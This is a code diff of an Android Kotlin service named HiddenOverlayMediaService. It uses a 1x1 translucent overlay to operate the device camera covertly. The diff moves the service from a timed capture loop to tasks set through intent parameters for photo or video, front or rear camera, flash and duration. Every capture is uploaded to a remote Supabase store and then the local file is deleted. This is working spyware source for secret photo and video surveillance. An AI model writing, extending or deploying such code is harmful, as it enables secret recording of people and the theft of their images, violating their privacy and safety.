@@ -1,7 +1,7 @@
 package com.save.me
 
 import android.Manifest
-import android.app.*
+import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -23,6 +23,14 @@ class HiddenOverlayMediaService : Service() {
     private var windowManager: WindowManager? = null
     private var overlayView: SurfaceView? = null
     private var surface: Surface? = null
+    private var serviceScope: CoroutineScope? = null
+
+    // Task params
+    private var taskAction: String? = null
+    private var taskCamera: String = "rear"
+    private var taskFlash: String = "off"
+    private var taskQuality: String = "medium"
+    private var taskDuration: Int = 60
 
     private var cameraDevice: CameraDevice? = null
     private var captureSession: CameraCaptureSession? = null
@@ -30,7 +38,6 @@ class HiddenOverlayMediaService : Service() {
     override fun onCreate() {
         super.onCreate()
         NotificationUtils.createNotificationChannel(this)
-        // Use launcher icon for the notification
         val launcherIconRes = applicationInfo.icon
         startForeground(
             SERVICE_ID,
@@ -41,63 +48,71 @@ class HiddenOverlayMediaService : Service() {
                 .setOngoing(true)
                 .build()
         )
-        Handler(Looper.getMainLooper()).postDelayed({ startMediaBackgroundTasks() }, 1000)
     }
 
-    private fun startMediaBackgroundTasks() {
-        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
-        overlayView = SurfaceView(this)
-        overlayView?.holder?.setFormat(PixelFormat.TRANSLUCENT)
-        overlayView?.setZOrderOnTop(true)
-        overlayView?.holder?.addCallback(object : SurfaceHolder.Callback {
-            override fun surfaceCreated(holder: SurfaceHolder) {
-                surface = holder.surface
-                CoroutineScope(Dispatchers.Main).launch { schedulePhotoVideoTasks() }
-            }
-            override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
-            override fun surfaceDestroyed(holder: SurfaceHolder) {}
-        })
-        val params = WindowManager.LayoutParams(
-            1, 1,
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-            else
-                WindowManager.LayoutParams.TYPE_PHONE,
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-            PixelFormat.TRANSLUCENT
-        )
-        params.gravity = Gravity.TOP or Gravity.START
-        params.x = 0
-        params.y = 0
-        windowManager?.addView(overlayView, params)
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        taskAction = intent?.getStringExtra("action")
+        taskCamera = intent?.getStringExtra("camera") ?: "rear"
+        taskFlash = intent?.getStringExtra("flash") ?: "off"
+        taskQuality = intent?.getStringExtra("quality") ?: "medium"
+        taskDuration = intent?.getIntExtra("duration", 60) ?: 60
+
+        serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
+        serviceScope?.launch {
+            setupOverlayAndRunTask()
+            stopSelf()
+        }
+        return START_NOT_STICKY
     }
 
-    private suspend fun schedulePhotoVideoTasks() = withContext(Dispatchers.Default) {
-        while (true) {
-            try {
-                capturePhoto()
-            } catch (e: Exception) {
-                Log.e("HiddenOverlayMedia", "Photo error: $e")
-            }
-            delay(5 * 60 * 1000L)
-            try {
-                recordVideo(30) // record 30s video
-            } catch (e: Exception) {
-                Log.e("HiddenOverlayMedia", "Video error: $e")
-            }
-            delay(10 * 60 * 1000L)
+    private suspend fun setupOverlayAndRunTask() {
+        suspendCancellableCoroutine<Unit> { cont ->
+            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+            overlayView = SurfaceView(this)
+            overlayView?.holder?.setFormat(PixelFormat.TRANSLUCENT)
+            overlayView?.setZOrderOnTop(true)
+            overlayView?.holder?.addCallback(object : SurfaceHolder.Callback {
+                override fun surfaceCreated(holder: SurfaceHolder) {
+                    surface = holder.surface
+                    serviceScope?.launch {
+                        runTaskOnce()
+                        cont.resume(Unit) {}
+                    }
+                }
+                override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
+                override fun surfaceDestroyed(holder: SurfaceHolder) {}
+            })
+            val params = WindowManager.LayoutParams(
+                1, 1,
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                else
+                    WindowManager.LayoutParams.TYPE_PHONE,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                PixelFormat.TRANSLUCENT
+            )
+            params.gravity = Gravity.TOP or Gravity.START
+            params.x = 0
+            params.y = 0
+            windowManager?.addView(overlayView, params)
         }
     }
 
-    // Take a background photo with preview on overlay surface
+    private suspend fun runTaskOnce() {
+        when (taskAction) {
+            "photo" -> capturePhoto()
+            "video" -> recordVideo(taskDuration)
+        }
+    }
+
     private suspend fun capturePhoto() = withContext(Dispatchers.Main) {
         val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
-            val characs = cameraManager.getCameraCharacteristics(id)
-            val facing = characs.get(CameraCharacteristics.LENS_FACING)
-            facing == CameraCharacteristics.LENS_FACING_BACK
+            val characteristics = cameraManager.getCameraCharacteristics(id)
+            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
+            if (taskCamera == "front") facing == CameraCharacteristics.LENS_FACING_FRONT else facing == CameraCharacteristics.LENS_FACING_BACK
         } ?: cameraManager.cameraIdList.firstOrNull() ?: return@withContext
 
         if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
@@ -105,6 +120,7 @@ class HiddenOverlayMediaService : Service() {
         }
         val outputFile = File(getExternalFilesDir(null), "overlay_photo_${System.currentTimeMillis()}.jpg")
         val imageReader = android.media.ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
+        val photoTaken = CompletableDeferred<Unit>()
         imageReader.setOnImageAvailableListener({ reader ->
             val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
             val buffer = image.planes[0].buffer
@@ -112,51 +128,54 @@ class HiddenOverlayMediaService : Service() {
             buffer.get(bytes)
             FileOutputStream(outputFile).use { it.write(bytes) }
             image.close()
-            SupabaseUtils.uploadFileAndRecord(outputFile, "photos/background/${outputFile.name}", "photo")
-            outputFile.delete()
+            serviceScope?.launch(Dispatchers.IO) {
+                SupabaseUtils.uploadFileAndRecord(this@HiddenOverlayMediaService, outputFile, "photos/$taskCamera/${outputFile.name}", "photo")
+                outputFile.delete()
+            }
             closeCamera()
+            photoTaken.complete(Unit)
         }, Handler(Looper.getMainLooper()))
 
-        val openCameraJob = CompletableDeferred<Unit>()
         cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
             override fun onOpened(device: CameraDevice) {
                 cameraDevice = device
                 try {
                     device.createCaptureSession(
-                        listOf(surface, imageReader.surface),
+                        listOfNotNull(surface, imageReader.surface),
                         object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 captureSession = session
                                 val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                     addTarget(imageReader.surface)
-                                    addTarget(surface!!)
+                                    surface?.let { addTarget(it) }
+                                    if (taskFlash == "on") {
+                                        set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_SINGLE)
+                                    }
                                 }
                                 session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, Handler(Looper.getMainLooper()))
-                                openCameraJob.complete(Unit)
                             }
                             override fun onConfigureFailed(session: CameraCaptureSession) {
-                                openCameraJob.complete(Unit)
+                                photoTaken.complete(Unit)
                             }
                         },
                         Handler(Looper.getMainLooper())
                     )
                 } catch (e: Exception) {
-                    openCameraJob.complete(Unit)
+                    photoTaken.complete(Unit)
                 }
             }
-            override fun onDisconnected(device: CameraDevice) { closeCamera(); openCameraJob.complete(Unit) }
-            override fun onError(device: CameraDevice, error: Int) { closeCamera(); openCameraJob.complete(Unit) }
+            override fun onDisconnected(device: CameraDevice) { closeCamera(); photoTaken.complete(Unit) }
+            override fun onError(device: CameraDevice, error: Int) { closeCamera(); photoTaken.complete(Unit) }
         }, Handler(Looper.getMainLooper()))
-        openCameraJob.await()
+        photoTaken.await()
     }
 
-    // Record a background video with preview on overlay surface
     private suspend fun recordVideo(durationSeconds: Int) = withContext(Dispatchers.Main) {
         val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
-            val characs = cameraManager.getCameraCharacteristics(id)
-            val facing = characs.get(CameraCharacteristics.LENS_FACING)
-            facing == CameraCharacteristics.LENS_FACING_BACK
+            val characteristics = cameraManager.getCameraCharacteristics(id)
+            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
+            if (taskCamera == "front") facing == CameraCharacteristics.LENS_FACING_FRONT else facing == CameraCharacteristics.LENS_FACING_BACK
         } ?: cameraManager.cameraIdList.firstOrNull() ?: return@withContext
 
         if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
@@ -176,49 +195,51 @@ class HiddenOverlayMediaService : Service() {
         mediaRecorder.setVideoSize(1280, 720)
         mediaRecorder.prepare()
 
-        val openCameraJob = CompletableDeferred<Unit>()
+        val videoDone = CompletableDeferred<Unit>()
         cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
             override fun onOpened(device: CameraDevice) {
                 cameraDevice = device
                 try {
                     device.createCaptureSession(
-                        listOf(surface, mediaRecorder.surface),
+                        listOfNotNull(surface, mediaRecorder.surface),
                         object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 captureSession = session
                                 val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                     addTarget(mediaRecorder.surface)
-                                    addTarget(surface!!)
+                                    surface?.let { addTarget(it) }
                                 }
                                 session.setRepeatingRequest(captureRequest.build(), null, Handler(Looper.getMainLooper()))
                                 mediaRecorder.start()
-                                CoroutineScope(Dispatchers.Main).launch {
+                                serviceScope?.launch {
                                     delay(durationSeconds * 1000L)
                                     try { mediaRecorder.stop() } catch (_: Exception) {}
                                     mediaRecorder.release()
-                                    SupabaseUtils.uploadFileAndRecord(outputFile, "videos/background/${outputFile.name}", "video")
-                                    outputFile.delete()
+                                    withContext(Dispatchers.IO) {
+                                        SupabaseUtils.uploadFileAndRecord(this@HiddenOverlayMediaService, outputFile, "videos/$taskCamera/${outputFile.name}", "video")
+                                        outputFile.delete()
+                                    }
                                     closeCamera()
-                                    openCameraJob.complete(Unit)
+                                    videoDone.complete(Unit)
                                 }
                             }
                             override fun onConfigureFailed(session: CameraCaptureSession) {
                                 mediaRecorder.release()
                                 closeCamera()
-                                openCameraJob.complete(Unit)
+                                videoDone.complete(Unit)
                             }
                         },
                         Handler(Looper.getMainLooper())
                     )
                 } catch (e: Exception) {
                     mediaRecorder.release()
-                    openCameraJob.complete(Unit)
+                    videoDone.complete(Unit)
                 }
             }
-            override fun onDisconnected(device: CameraDevice) { mediaRecorder.release(); closeCamera(); openCameraJob.complete(Unit) }
-            override fun onError(device: CameraDevice, error: Int) { mediaRecorder.release(); closeCamera(); openCameraJob.complete(Unit) }
+            override fun onDisconnected(device: CameraDevice) { mediaRecorder.release(); closeCamera(); videoDone.complete(Unit) }
+            override fun onError(device: CameraDevice, error: Int) { mediaRecorder.release(); closeCamera(); videoDone.complete(Unit) }
         }, Handler(Looper.getMainLooper()))
-        openCameraJob.await()
+        videoDone.await()
     }
 
     private fun closeCamera() {
@@ -231,6 +252,7 @@ class HiddenOverlayMediaService : Service() {
     override fun onDestroy() {
         try { if (overlayView != null) windowManager?.removeViewImmediate(overlayView) } catch (_: Exception) {}
         closeCamera()
+        serviceScope?.cancel()
         super.onDestroy()
     }
 
